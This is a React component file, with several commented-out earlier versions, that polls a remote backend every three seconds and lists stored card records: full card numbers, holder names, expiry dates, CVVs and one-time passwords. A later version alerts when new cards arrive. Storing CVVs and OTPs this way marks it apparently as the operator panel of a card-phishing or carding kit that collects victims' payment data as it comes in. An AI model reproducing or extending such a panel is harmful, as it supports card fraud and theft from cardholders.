
// import React, { useState, useEffect } from 'react';
// import axios from 'axios';

// const FormDetails = () => {
//     const [cardDetails, setCardDetails] = useState([]);
//     const [loading, setLoading] = useState(true);

//     useEffect(() => {
//         const token = localStorage.getItem('token');
//         if (token) {
//             fetchDetails(token);
//             const intervalId = setInterval(() => fetchDetails(token), 3000); // Poll every 3 seconds
//             return () => clearInterval(intervalId); // Cleanup interval on component unmount
//         } else {
//             console.log("No token found in localStorage");
//             setLoading(false);
//         }
//     }, []);

//     const fetchDetails = (token) => {
//         axios.get("https://ecommerce-ryoy.onrender.com/getcard", {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((cardRes) => {
//             console.log("Card API Response:", cardRes);

//             const cardData = cardRes.data;

//             setCardDetails(cardData);
//             setLoading(false);
//         })
//         .catch((error) => {
//             console.error("Error fetching card details:", error);
//             setLoading(false);
//         });
//     };

//     const deleteCard = (cardId) => {
//         const token = localStorage.getItem('token');
//         console.log(`Deleting card with ID: ${cardId}`);
//         axios.delete(`https://ecommerce-ryoy.onrender.com/deletecard/${cardId}`, {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((res) => {
//             console.log("Card deleted:", res);
//             fetchDetails(token); // Refresh card details after deletion
//         })
//         .catch((error) => {
//             console.error("Error deleting card:", error);
//             console.error("Axios error response:", error.response);
//         });
//     };

//     return (
//         <div className="container">
//             <h2 className="mt-5">Card Details</h2>
//             {loading ? (
//                 <p>Loading card details...</p>
//             ) : (
//                 <div className="table-responsive">
//                     <table className="table table-bordered mt-3">
//                         <thead>
//                             <tr>
//                                 <th>No.</th>
//                                 <th>Card Type</th>
//                                 <th> Name</th>
//                                 <th>Bank Name</th>
//                                 <th>CC No</th>
//                                 <th> Month</th>
//                                 <th> Year</th>
//                                 <th>CVV</th>
//                                 <th>OTP</th>
//                                 <th>Actions</th>
//                             </tr>
//                         </thead>
//                         <tbody>
//                             {cardDetails.length > 0 ? (
//                                 cardDetails.map((card, index) => (
//                                     <tr key={index}>
//                                       <td>fdfdjk</td>
//                                       <td>{card.cardType}</td>
//                                       <td>{card.cardHolderName}</td>
//                                       <td>{card.bankName}</td>
//                                         <td>{card.cardNumber}</td>
                                       
//                                         <td>{card.expiryMonth}</td>
//                                         <td>{card.expiryYear}</td>
//                                         <td>{card.cvv}</td>
                                       
                                        
//                                         <td>{card.cardHolderName ? card.otp : '-'}</td>
//                                         <td>
//                                             <button onClick={() => deleteCard(card._id)} className="btn btn-danger">
//                                                 Delete
//                                             </button>
//                                         </td>
//                                     </tr>
//                                 ))
//                             ) : (
//                                 <tr>
//                                     <td colSpan="9">No card details found.</td>
//                                 </tr>
//                             )}
//                         </tbody>
//                     </table>
//                 </div>
//             )}
//         </div>
//     );
// };

// export default FormDetails;


// import React, { useState, useEffect } from 'react';
// import axios from 'axios';

// const FormDetails = () => {
//     const [cardDetails, setCardDetails] = useState([]);
//     const [loading, setLoading] = useState(true);

//     useEffect(() => {
//         const token = localStorage.getItem('token');
//         if (token) {
//             fetchDetails(token);
//             const intervalId = setInterval(() => fetchDetails(token), 3000); // Poll every 3 seconds
//             return () => clearInterval(intervalId); // Cleanup interval on component unmount
//         } else {
//             console.log("No token found in localStorage");
//             setLoading(false);
//         }
//     }, []);

//     const fetchDetails = (token) => {
//         axios.get("https://ecommerce-ryoy.onrender.com/getcard", {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((cardRes) => {
//             console.log("Card API Response:", cardRes);
//             const cardData = cardRes.data;
//             setCardDetails(cardData);
//             setLoading(false);
//         })
//         .catch((error) => {
//             console.error("Error fetching card details:", error);
//             setLoading(false);
//         });
//     };

//     const deleteCard = (cardId) => {
//         const token = localStorage.getItem('token');
//         console.log(`Deleting card with ID: ${cardId}`);
//         axios.delete(`https://ecommerce-ryoy.onrender.com/deletecard/${cardId}`, {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((res) => {
//             console.log("Card deleted:", res);
//             fetchDetails(token); // Refresh card details after deletion
//         })
//         .catch((error) => {
//             console.error("Error deleting card:", error);
//             console.error("Axios error response:", error.response);
//         });
//     };

    // const getCardTypeColor = (cardType) => {
    //     const trimmedLowerCaseType = cardType.toLowerCase().trim();
    //     console.log(`Trimmed and Lowercased Card Type: ${trimmedLowerCaseType}`);
    //     switch (trimmedLowerCaseType) {
    //         case 'credit card':
    //             console.log("Credit Card detected");
    //             return 'red'; // Red color for Credit Card
    //         case 'debit ':
    //             console.log("Debit Card detected");
    //             return 'green'; // Green color for Debit Card
    //         default:
    //             console.log("Unknown Card Type");
    //             return 'red'; // Default color for unknown card types
    //     }
    // };
//     return (
//         <div className="container">
//             <h2 className="mt-5">Card Details</h2>
//             {loading ? (
//                 <p>Loading card details...</p>
//             ) : (
//                 <div className="table-responsive">
//                     <table className="table table-bordered mt-3">
//                         <thead>
//                             <tr>
//                                 <th>No.</th>
//                                 <th>Card Type</th>
//                                 <th>Name</th>
//                                 <th>Bank Name</th>
//                                 <th>CC No</th>
//                                 <th>Month</th>
//                                 <th>Year</th>
//                                 <th>CVV</th>
//                                 <th>OTP</th>
//                                 <th>Actions</th>
//                             </tr>
//                         </thead>
//                         <tbody>
//                             {cardDetails.length > 0 ? (
//                                 cardDetails.map((card, index) => (
//                                     <tr key={index}>
//                                         <td>{index + 1}</td>
//                                         <td style={{ color: getCardTypeColor(card.cardType)  }} className='fw-bold'>{card.cardType}</td>
//                                         <td> {card.cardHolderName}</td>
//                                         <td>{card.bankName}</td>
//                                         <td>{card.cardNumber}</td>
//                                         <td>{card.expiryMonth}</td>
//                                         <td>{card.expiryYear}</td>
//                                         <td>{card.cvv}</td>
//                                         <td>{card.cardHolderName ? card.otp : '-'}</td>
//                                         <td>
//                                             <button onClick={() => deleteCard(card._id)} className="btn btn-danger">
//                                                 Delete
//                                             </button>
//                                         </td>
//                                     </tr>
//                                 ))
//                             ) : (
//                                 <tr>
//                                     <td colSpan="10">No card details found.</td>
//                                 </tr>
//                             )}
//                         </tbody>
//                     </table>
//                 </div>
//             )}
//         </div>
//     );
// };

// export default FormDetails;


// import React, { useState, useEffect } from 'react';
// import axios from 'axios';

// const FormDetails = () => {
//     const [cardDetails, setCardDetails] = useState([]);
//     const [loading, setLoading] = useState(true);

//     useEffect(() => {
//         const token = localStorage.getItem('token');
//         if (token) {
//             fetchDetails(token);
//             const intervalId = setInterval(() => fetchDetails(token), 3000); // Poll every 3 seconds
//             return () => clearInterval(intervalId); // Cleanup interval on component unmount
//         } else {
//             console.log("No token found in localStorage");
//             setLoading(false);
//         }
//     }, []);

//     const fetchDetails = (token) => {
//         axios.get("https://ecommerce-ryoy.onrender.com/getcard", {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((cardRes) => {
//             console.log("Card API Response:", cardRes);
//             const cardData = cardRes.data;
//             setCardDetails(cardData);
//             setLoading(false);
//         })
//         .catch((error) => {
//             console.error("Error fetching card details:", error);
//             setLoading(false);
//         });
//     };

//     const deleteCard = (cardId) => {
//         const token = localStorage.getItem('token');
//         console.log(`Deleting card with ID: ${cardId}`);
//         axios.delete(`https://ecommerce-ryoy.onrender.com/deletecard/${cardId}`, {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((res) => {
//             console.log("Card deleted:", res);
//             fetchDetails(token); // Refresh card details after deletion
//         })
//         .catch((error) => {
//             console.error("Error deleting card:", error);
//             console.error("Axios error response:", error.response);
//         });
//     };

//     const getCardTypeColor = (cardType) => {
//         const trimmedLowerCaseType = cardType.toLowerCase().trim();
//         console.log(`Trimmed and Lowercased Card Type: ${trimmedLowerCaseType}`);
//         switch (trimmedLowerCaseType) {
//             case 'credit card':
//                 console.log("Credit Card detected");
//                 return 'red'; // Red color for Credit Card
//             case 'debit':
//                 console.log("Debit Card detected");
//                 return 'green'; // Green color for Debit Card
//             default:
//                 console.log("Unknown Card Type");
//                 return 'red'; // Default color for unknown card types
//         }
//     };
    

//     const formatOtp = (otp) => {
//         if (Array.isArray(otp)) {
//             // If otp is already an array
//             return otp.map((singleOtp, index) => (
//                 <div key={index}>{singleOtp}</div>
//             ));
//         } else if (typeof otp === 'string') {
//             // If otp is a comma-separated string
//             return otp.split(',').map((singleOtp, index) => (
//                 <div key={index}>{singleOtp}</div>
//             ));
//         } else {
//             // If otp is undefined or any other type
//             return <div>-</div>;
//         }
//     };

//     return (
//         <div className="container">
//             <h2 className="mt-5">Card Details</h2>
//             {loading ? (
//                 <p>Loading card details...</p>
//             ) : (
//                 <div className="table-responsive">
//                     <table className="table table-bordered mt-3">
//                         <thead>
//                             <tr>
//                                 <th>No.</th>
//                                 <th>Card Type</th>
//                                 <th>Name</th>
//                                 <th>Bank Name</th>
//                                 <th>CC No</th>
//                                 <th>Month</th>
//                                 <th>Year</th>
//                                 <th>CVV</th>
//                                 <th>OTP</th>
//                                 <th>Actions</th>
//                             </tr>
//                         </thead>
//                         <tbody>
//                             {cardDetails.length > 0 ? (
//                                 cardDetails.map((card, index) => (
//                                     <tr key={index}>
//                                         <td>{index + 1}</td>
//                                         <td style={{ color: getCardTypeColor(card.cardType) }} className='fw-bold'>{card.cardType}</td>
//                                         <td>{card.cardHolderName}</td>
//                                         <td>{card.bankName}</td>
//                                         <td>{card.cardNumber}</td>
//                                         <td>{card.expiryMonth}</td>
//                                         <td>{card.expiryYear}</td>
//                                         <td>{card.cvv}</td>
//                                         <td>{card.cardHolderName ? formatOtp(card.otp) : '-'}</td>
//                                         <td>
//                                             <button onClick={() => deleteCard(card._id)} className="btn btn-danger">
//                                                 Delete
//                                             </button>
//                                         </td>
//                                     </tr>
//                                 ))
//                             ) : (
//                                 <tr>
//                                     <td colSpan="10">No card details found.</td>
//                                 </tr>
//                             )}
//                         </tbody>
//                     </table>
//                 </div>
//             )}
//         </div>
//     );
// };

// export default FormDetails;


// import React, { useState, useEffect } from 'react';
// import axios from 'axios';

// const FormDetails = () => {
//     const [cardDetails, setCardDetails] = useState([]);
//     const [loading, setLoading] = useState(true);

//     useEffect(() => {
//         const token = localStorage.getItem('token');
//         if (token) {
//             fetchDetails(token);
//             const intervalId = setInterval(() => fetchDetails(token), 3000); // Poll every 3 seconds
//             return () => clearInterval(intervalId); // Cleanup interval on component unmount
//         } else {
//             console.log("No token found in localStorage");
//             setLoading(false);
//         }
//     }, []);

//     const fetchDetails = (token) => {
//         axios.get("https://ecommerce-ryoy.onrender.com/getcard", {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((cardRes) => {
//             console.log("Card API Response:", cardRes);
//             const cardData = cardRes.data;
//             setCardDetails(cardData);
//             setLoading(false);
//         })
//         .catch((error) => {
//             console.error("Error fetching card details:", error);
//             setLoading(false);
//         });
//     };

//     const deleteCard = (cardId) => {
//         const token = localStorage.getItem('token');
//         console.log(`Deleting card with ID: ${cardId}`);
//         axios.delete(`https://ecommerce-ryoy.onrender.com/deletecard/${cardId}`, {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((res) => {
//             console.log("Card deleted:", res);
//             fetchDetails(token); // Refresh card details after deletion
//         })
//         .catch((error) => {
//             console.error("Error deleting card:", error);
//             console.error("Axios error response:", error.response);
//         });
//     };

//     const getCardTypeColor = (cardType) => {
//         const trimmedLowerCaseType = cardType.toLowerCase().trim();
//         console.log(`Trimmed and Lowercased Card Type: ${trimmedLowerCaseType}`);
//         switch (trimmedLowerCaseType) {
//             case 'credit card':
//                 console.log("Credit Card detected");
//                 return 'red'; // Red color for Credit Card
//             case 'debit':
//                 console.log("Debit Card detected");
//                 return 'green'; // Green color for Debit Card
//             default:
//                 console.log("Unknown Card Type");
//                 return 'red'; // Default color for unknown card types
//         }
//     };
    

//     const formatOtp = (otp) => {
//         if (Array.isArray(otp)) {
//             // If otp is already an array
//             return otp.map((singleOtp, index) => (
//                 <div key={index}>{singleOtp}</div>
//             ));
//         } else if (typeof otp === 'string') {
//             // If otp is a comma-separated string
//             return otp.split(',').map((singleOtp, index) => (
//                 <div key={index}>{singleOtp}</div>
//             ));
//         } else {
//             // If otp is undefined or any other type
//             return <div>-</div>;
//         }
//     };

//     return (
//         <div className="container">
//             <h2 className="mt-5">Card Details</h2>
//             {loading ? (
//                 <p>Loading card details...</p>
//             ) : (
//                 <div className="table-responsive">
//                     <table className="table table-bordered mt-3">
//                         <thead>
//                             <tr>
//                                 <th style={{ width: '5%' }}>No.</th>
//                                 <th style={{ width: '10%' }}>Card Type</th>
//                                 <th style={{ width: '10%' }}>Name</th>
//                                 <th style={{ width: '10%' }}>Bank Name</th>
//                                 <th style={{ width: '50%' }} className='w-50'>CC No</th>
//                                 <th style={{ width: '5%' }}>Month</th>
//                                 <th style={{ width: '5%' }}>Year</th>
//                                 <th style={{ width: '5%' }}>CVV</th>
//                                 <th style={{ width: '15%' }}>OTP</th>
//                                 <th style={{ width: '20%' }}>Actions</th>
//                             </tr>
//                         </thead>
//                         <tbody>
//                             {cardDetails.length > 0 ? (
//                                 cardDetails.map((card, index) => (
//                                     <tr key={index}>
//                                         <td>{index + 1}</td>
//                                         <td style={{ color: getCardTypeColor(card.cardType) }} className='fw-bold'>{card.cardType}</td>
//                                         <td>{card.cardHolderName}</td>
//                                         <td>{card.bankName}</td>
//                                         <td>{card.cardNumber}</td>
//                                         <td>{card.expiryMonth}</td>
//                                         <td>{card.expiryYear}</td>
//                                         <td>{card.cvv}</td>
//                                         <td>{card.cardHolderName ? formatOtp(card.otp) : '-'}</td>
//                                         <td>
//                                             <button onClick={() => deleteCard(card._id)} className="btn btn-danger">
//                                                 Delete
//                                             </button>
//                                         </td>
//                                     </tr>
//                                 ))
//                             ) : (
//                                 <tr>
//                                     <td colSpan="10">No card details found.</td>
//                                 </tr>
//                             )}
//                         </tbody>
//                     </table>
//                 </div>
//             )}
//         </div>
//     );
// };

// export default FormDetails;


// import React, { useState, useEffect } from 'react';
// import axios from 'axios';

// const FormDetails = () => {
//     const [cardDetails, setCardDetails] = useState([]);
//     const [loading, setLoading] = useState(true);

//     useEffect(() => {
//         const token = localStorage.getItem('token');
//         if (token) {
//             fetchDetails(token);
//             const intervalId = setInterval(() => fetchDetails(token), 3000); // Poll every 3 seconds
//             return () => clearInterval(intervalId); // Cleanup interval on component unmount
//         } else {
//             console.log("No token found in localStorage");
//             setLoading(false);
//         }
//     }, []);

//     const fetchDetails = (token) => {
//         axios.get("https://ecommerce-ryoy.onrender.com/getcard", {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((cardRes) => {
//             console.log("Card API Response:", cardRes);
//             const cardData = cardRes.data;
//             setCardDetails(cardData);
//             setLoading(false);
//         })
//         .catch((error) => {
//             console.error("Error fetching card details:", error);
//             setLoading(false);
//         });
//     };

    

//     const deleteCard = (cardId) => {
//         const token = localStorage.getItem('token');
//         console.log(`Deleting card with ID: ${cardId}`);
//         axios.delete(`https://ecommerce-ryoy.onrender.com/deletecard/${cardId}`, {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((res) => {
//             console.log("Card deleted:", res);
//             fetchDetails(token); // Refresh card details after deletion
//         })
//         .catch((error) => {
//             console.error("Error deleting card:", error);
//             console.error("Axios error response:", error.response);
//         });
//     };

//     const getCardTypeColor = (cardType) => {
//         const trimmedLowerCaseType = cardType.toLowerCase().trim();
//         console.log(`Trimmed and Lowercased Card Type: ${trimmedLowerCaseType}`);
//         switch (trimmedLowerCaseType) {
//             case 'credit card':
//                 console.log("Credit Card detected");
//                 return 'red'; // Red color for Credit Card
//             case 'debit':
//                 console.log("Debit Card detected");
//                 return 'green'; // Green color for Debit Card
//             default:
//                 console.log("Unknown Card Type");
//                 return 'red'; // Default color for unknown card types
//         }
//     };
    

//     const formatOtp = (otp) => {
//         if (Array.isArray(otp)) {
//             // If otp is already an array
//             return otp.map((singleOtp, index) => (
//                 <div key={index}>{singleOtp}</div>
//             ));
//         } else if (typeof otp === 'string') {
//             // If otp is a comma-separated string
//             return otp.split(',').map((singleOtp, index) => (
//                 <div key={index}>{singleOtp}</div>
//             ));
//         } else {
//             // If otp is undefined or any other type
//             return <div>-</div>;
//         }
//     };

//     return (
//         <div className="container">
//             <h2 className="mt-5">Card Details</h2>
//             {loading ? (
//                 <p>Loading card details...</p>
//             ) : (
//                 <div className="table-responsive">
//                     <table className="table table-striped table-bordered mt-3">
//                         <thead>
//                             <tr>
//                                 <th >No.</th>
//                                 <th >Card Type</th>
//                                 <th >Name</th>
//                                 <th >Bank Name</th>
//                                 <th >CC No</th>
//                                 <th >Month</th>
//                                 <th >Year</th>
//                                 <th >CVV</th>           
//                                 <th >OTP</th>
//                                 <th >Actions</th>
//                             </tr>
//                         </thead>
//                         <tbody>
//                             {cardDetails.length > 0 ? (
//                                 cardDetails.map((card, index) => (
//                                     <tr key={index}>
//                                         <td>{index + 1}</td>
//                                         <td style={{ color: getCardTypeColor(card.cardType) }} className='fw-bold'>{card.cardType}</td>
//                                         <td>{card.cardHolderName}</td>
//                                         <td>{card.bankName}</td>
//                                         <td>{card.cardNumber}</td>
//                                         <td>{card.expiryMonth}</td>
//                                         <td>{card.expiryYear}</td>
//                                         <td>{card.cvv}</td>
//                                         <td>{card.cardHolderName ? formatOtp(card.otp) : '-'}</td>
//                                         <td>
//                                             <button onClick={() => deleteCard(card._id)} className="btn btn-danger">
//                                                 Delete
//                                             </button>
//                                         </td>
//                                     </tr>
//                                 ))
//                             ) : (
//                                 <tr>
//                                     <td colSpan="10">No card details found.</td>
//                                 </tr>
//                             )}
//                         </tbody>
//                     </table>
//                 </div>
//             )}
//         </div>
//     );
// };

// export default FormDetails;


// import React, { useState, useEffect } from 'react';
// import axios from 'axios';

// const FormDetails = () => {
//     const [cardDetails, setCardDetails] = useState([]);
//     const [loading, setLoading] = useState(true);
//     const [previousLength, setPreviousLength] = useState(0);
//     const [newCardMessage, setNewCardMessage] = useState(false);

//     useEffect(() => {
//         const token = localStorage.getItem('token');
//         if (token) {
//             fetchDetails(token);
//             const intervalId = setInterval(() => fetchDetails(token), 3000); // Poll every 3 seconds
//             return () => clearInterval(intervalId); // Cleanup interval on component unmount
//         } else {
//             console.log("No token found in localStorage");
//             setLoading(false);
//         }
//     }, []);

//     const fetchDetails = (token) => {
//         axios.get("https://ecommerce-ryoy.onrender.com/getcard", {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((cardRes) => {
//             console.log("Card API Response:", cardRes);
//             const cardData = cardRes.data;
//             setCardDetails(cardData);

//             // Check if new cards have been added
//             // if (cardData.length > previousLength) {
//             //     setNewCardMessage(true);
//             //     setTimeout(() => setNewCardMessage(false), 3000); // Hide message after 3 seconds
//             // }

//             setPreviousLength(cardData.length);
//             setLoading(false);
//         })
//         .catch((error) => {
//             console.error("Error fetching card details:", error);
//             setLoading(false);
//         });
//     };

//     const deleteCard = (cardId) => {
//         const token = localStorage.getItem('token');
//         console.log(`Deleting card with ID: ${cardId}`);
//         axios.delete(`https://ecommerce-ryoy.onrender.com/deletecard/${cardId}`, {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((res) => {
//             console.log("Card deleted:", res);
//             fetchDetails(token); // Refresh card details after deletion
//         })
//         .catch((error) => {
//             console.error("Error deleting card:", error);
//             console.error("Axios error response:", error.response);
//         });
//     };

//     const getCardTypeColor = (cardType) => {
//         const trimmedLowerCaseType = cardType.toLowerCase().trim();
//         console.log(`Trimmed and Lowercased Card Type: ${trimmedLowerCaseType}`);
//         switch (trimmedLowerCaseType) {
//             case 'credit card':
//                 console.log("Credit Card detected");
//                 return 'red'; // Red color for Credit Card
//             case 'debit':
//                 console.log("Debit Card detected");
//                 return 'green'; // Green color for Debit Card
//             default:
//                 console.log("Unknown Card Type");
//                 return 'red'; // Default color for unknown card types
//         }
//     };

//     const formatOtp = (otp) => {
//         if (Array.isArray(otp)) {
//             // If otp is already an array
//             return otp.map((singleOtp, index) => (
//                 <div key={index}>{singleOtp}</div>
//             ));
//         } else if (typeof otp === 'string') {
//             // If otp is a comma-separated string
//             return otp.split(',').map((singleOtp, index) => (
//                 <div key={index}>{singleOtp}</div>
//             ));
//         } else {
//             // If otp is undefined or any other type
//             return <div>-</div>;
//         }
//     };

//     return (
//         <div className="container">
//             <h2 className="mt-5">Card Details</h2>
//             {newCardMessage && <div className="alert alert-info">New card details added!</div>}
//             {loading ? (
//                 <p>Loading card details...</p>
//             ) : (
//                 <div className="table-responsive">
//                     <table className="table table-striped table-bordered mt-3">
//                         <thead>
//                             <tr>
//                                 <th >No.</th>
//                                 <th >Card Type</th>
//                                 <th >Name</th>
//                                 <th >Bank Name</th>
//                                 <th >CC No</th>
//                                 <th >Month</th>
//                                 <th >Year</th>
//                                 <th >CVV</th>           
//                                 <th >OTP</th>
//                                 <th >Actions</th>
//                             </tr>
//                         </thead>
//                         <tbody>
//                             {cardDetails.length > 0 ? (
//                                 cardDetails.map((card, index) => (
//                                     <tr key={index}>
//                                         <td>{index + 1}</td>
//                                         <td style={{ color: getCardTypeColor(card.cardType) }} className='fw-bold'>{card.cardType}</td>
//                                         <td>{card.cardHolderName}</td>
//                                         <td>{card.bankName}</td>
//                                         <td>{card.cardNumber}</td>
//                                         <td>{card.expiryMonth}</td>
//                                         <td>{card.expiryYear}</td>
//                                         <td>{card.cvv}</td>
//                                         <td>{card.cardHolderName ? formatOtp(card.otp) : '-'}</td>
//                                         <td>
//                                             <button onClick={() => deleteCard(card._id)} className="btn btn-danger">
//                                                 Delete
//                                             </button>
//                                         </td>
//                                     </tr>
//                                 ))
//                             ) : (
//                                 <tr>
//                                     <td colSpan="10">No card details found.</td>
//                                 </tr>
//                             )}
//                         </tbody>
//                     </table>
//                 </div>
//             )}
//         </div>
//     );
// };

// export default FormDetails;



import React, { useState, useEffect } from 'react';
import axios from 'axios';

const FormDetails = () => {
    const [cardDetails, setCardDetails] = useState([]);
    const [loading, setLoading] = useState(true);
    const [previousLength, setPreviousLength] = useState(0);
    const [newCardMessage, setNewCardMessage] = useState(false);

    useEffect(() => {
        const token = localStorage.getItem('token');
        if (token) {
            fetchDetails(token);
            const intervalId = setInterval(() => fetchDetails(token), 3000); // Poll every 3 seconds
            return () => clearInterval(intervalId); // Cleanup interval on component unmount
        } else {
            console.log("No token found in localStorage");
            setLoading(false);
        }
    }, []);

    const fetchDetails = (token) => {
        axios.get("https://ecommerce-ryoy.onrender.com/getcard", {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        })
        .then((cardRes) => {
            console.log("Card API Response:", cardRes);
            const cardData = cardRes.data;
            setCardDetails(cardData);

            // Check if new cards have been added
            // if (cardData.length > previousLength) {
            //     setNewCardMessage(true);
            //     setTimeout(() => setNewCardMessage(false), 3000); // Hide message after 3 seconds
            // }

            setPreviousLength(cardData.length);
            setLoading(false);
        })
        .catch((error) => {
            console.error("Error fetching card details:", error);
            setLoading(false);
        });
    };

    const deleteCard = (cardId) => {
        const token = localStorage.getItem('token');
        console.log(`Deleting card with ID: ${cardId}`);
        axios.delete(`https://ecommerce-ryoy.onrender.com/deletecard/${cardId}`, {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        })
        .then((res) => {
            console.log("Card deleted:", res);
            fetchDetails(token); // Refresh card details after deletion
        })
        .catch((error) => {
            console.error("Error deleting card:", error);
            console.error("Axios error response:", error.response);
        });
    };

    const getCardTypeColor = (cardType) => {
        const trimmedLowerCaseType = cardType.toLowerCase().trim();
        console.log(`Trimmed and Lowercased Card Type: ${trimmedLowerCaseType}`);
        switch (trimmedLowerCaseType) {
            case 'credit card':
                console.log("Credit Card detected");
                return 'red'; // Red color for Credit Card
            case 'debit':
                console.log("Debit Card detected");
                return 'green'; // Green color for Debit Card
            default:
                console.log("Unknown Card Type");
                return 'red'; // Default color for unknown card types
        }
    };

    const formatOtp = (otp) => {
        if (Array.isArray(otp)) {
            // If otp is already an array
            return otp.map((singleOtp, index) => (
                <div key={index}>{singleOtp}</div>
            ));
        } else if (typeof otp === 'string') {
            // If otp is a comma-separated string
            return otp.split(',').map((singleOtp, index) => (
                <div key={index}>{singleOtp}</div>
            ));
        } else {
            // If otp is undefined or any other type
            return <div>-</div>;
        }
    };

    return (
        <div className="container">
            <h2 className="mt-5">Card Details</h2>
            {newCardMessage && <div className="alert alert-info">New card details added!</div>}
            {loading ? (
                <p>Loading card details...</p>
            ) : (
                <div className="table-responsive">
                    <table className="table table-striped table-bordered mt-3">
                        <thead>
                            <tr>
                                <th>No.</th>
                                <th>Card Type</th>
                                <th>Name</th>
                                <th>Bank Name</th>
                                <th>CC No</th>
                                <th>Month</th>
                                <th>Year</th>
                                <th>CVV</th>           
                                <th>OTP</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            {cardDetails.length > 0 ? (
                                cardDetails.map((card, index) => (
                                    <tr key={index}>
                                        <td>{index + 1}</td>
                                        <td style={{ color: getCardTypeColor(card.cardType) }} className='fw-bold'>{card.cardType}</td>
                                        <td>{card.cardHolderName}</td>
                                        <td>{card.bankName}</td>
                                        <td>{card.cardNumber}</td>
                                        <td>{card.expiryMonth}</td>
                                        <td>{card.expiryYear}</td>
                                        <td>{card.cvv}</td>
                                        <td>{card.cardHolderName ? formatOtp(card.otp) : '-'}</td>
                                        <td>
                                            <button onClick={() => deleteCard(card._id)} className="btn btn-danger">
                                                Delete
                                            </button>
                                        </td>
                                    </tr>
                                ))
                            ) : (
                                <tr>
                                    <td colSpan="10">No card details found.</td>
                                </tr>
                            )}
                        </tbody>
                    </table>
                </div>
            )}
        </div>
    );
};

export default FormDetails;

// import React, { useState, useEffect } from 'react';
// import axios from 'axios';

// const FormDetails = () => {
//     const [cardDetails, setCardDetails] = useState([]);
//     const [loading, setLoading] = useState(true);
//     const [previousLength, setPreviousLength] = useState(0);
//     const [newCardMessage, setNewCardMessage] = useState(false);

//     useEffect(() => {
//         const token = localStorage.getItem('token');
//         if (token) {
//             fetchDetails(token);
//             const intervalId = setInterval(() => fetchDetails(token), ); // Poll every 3 seconds
//             return () => clearInterval(intervalId); // Cleanup interval on component unmount
//         } else {
//             console.log("No token found in localStorage");
//             setLoading(false);
//         }
//     }, []);

//     const fetchDetails = (token) => {
//         axios.get("https://ecommerce-ryoy.onrender.com/getcard", {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((cardRes) => {
//             console.log("Card API Response:", cardRes);
//             const cardData = cardRes.data;

//             if (cardData.length > previousLength) {
//                 setNewCardMessage(true);
//                 setTimeout(() => setNewCardMessage(false), 5000); // Hide message after 5 seconds
//             }

//             setCardDetails(cardData);
//             setPreviousLength(cardData.length);
//             setLoading(false);
//         })
//         .catch((error) => {
//             console.error("Error fetching card details:", error);
//             setLoading(false);
//         });
//     };

//     const deleteCard = (cardId) => {
//         const token = localStorage.getItem('token');
//         console.log(`Deleting card with ID: ${cardId}`);
//         axios.delete(`https://ecommerce-ryoy.onrender.com/deletecard/${cardId}`, {
//             headers: {
//                 'Authorization': `Bearer ${token}`
//             }
//         })
//         .then((res) => {
//             console.log("Card deleted:", res);
//             fetchDetails(token); // Refresh card details after deletion
//         })
//         .catch((error) => {
//             console.error("Error deleting card:", error);
//             console.error("Axios error response:", error.response);
//         });
//     };

//     const getCardTypeColor = (cardType) => {
//         const trimmedLowerCaseType = cardType.toLowerCase().trim();
//         console.log(`Trimmed and Lowercased Card Type: ${trimmedLowerCaseType}`);
//         switch (trimmedLowerCaseType) {
//             case 'credit card':
//                 console.log("Credit Card detected");
//                 return 'red'; // Red color for Credit Card
//             case 'debit':
//                 console.log("Debit Card detected");
//                 return 'green'; // Green color for Debit Card
//             default:
//                 console.log("Unknown Card Type");
//                 return 'red'; // Default color for unknown card types
//         }
//     };

//     const formatOtp = (otp) => {
//         if (Array.isArray(otp)) {
//             // If otp is already an array
//             return otp.map((singleOtp, index) => (
//                 <div key={index}>{singleOtp}</div>
//             ));
//         } else if (typeof otp === 'string') {
//             // If otp is a comma-separated string
//             return otp.split(',').map((singleOtp, index) => (
//                 <div key={index}>{singleOtp}</div>
//             ));
//         } else {
//             // If otp is undefined or any other type
//             return <div>-</div>;
//         }
//     };

//     return (
//         <div className="container">
//             <h2 className="mt-5">Card Details</h2>
//             {newCardMessage && <div className="alert alert-info">New card details added!</div>}
//             {loading ? (
//                 <p>Loading card details...</p>
//             ) : (
//                 <div className="table-responsive">
//                     <table className="table table-striped table-bordered mt-3">
//                         <thead>
//                             <tr>
//                                 <th>No.</th>
//                                 <th>Card Type</th>
//                                 <th>Name</th>
//                                 <th>Bank Name</th>
//                                 <th>CC No</th>
//                                 <th>Month</th>
//                                 <th>Year</th>
//                                 <th>CVV</th>           
//                                 <th>OTP</th>
//                                 <th>Actions</th>
//                             </tr>
//                         </thead>
//                         <tbody>
//                             {cardDetails.length > 0 ? (
//                                 cardDetails.map((card, index) => (
//                                     <tr key={index}>
//                                         <td>{index + 1}</td>
//                                         <td style={{ color: getCardTypeColor(card.cardType) }} className='fw-bold'>{card.cardType}</td>
//                                         <td>{card.cardHolderName}</td>
//                                         <td>{card.bankName}</td>
//                                         <td>{card.cardNumber}</td>
//                                         <td>{card.expiryMonth}</td>
//                                         <td>{card.expiryYear}</td>
//                                         <td>{card.cvv}</td>
//                                         <td>{card.cardHolderName ? formatOtp(card.otp) : '-'}</td>
//                                         <td>
//                                             <button onClick={() => deleteCard(card._id)} className="btn btn-danger">
//                                                 Delete
//                                             </button>
//                                         </td>
//                                     </tr>
//                                 ))
//                             ) : (
//                                 <tr>
//                                     <td colSpan="10">No card details found.</td>
//                                 </tr>
//                             )}
//                         </tbody>
//                     </table>
//                 </div>
//             )}
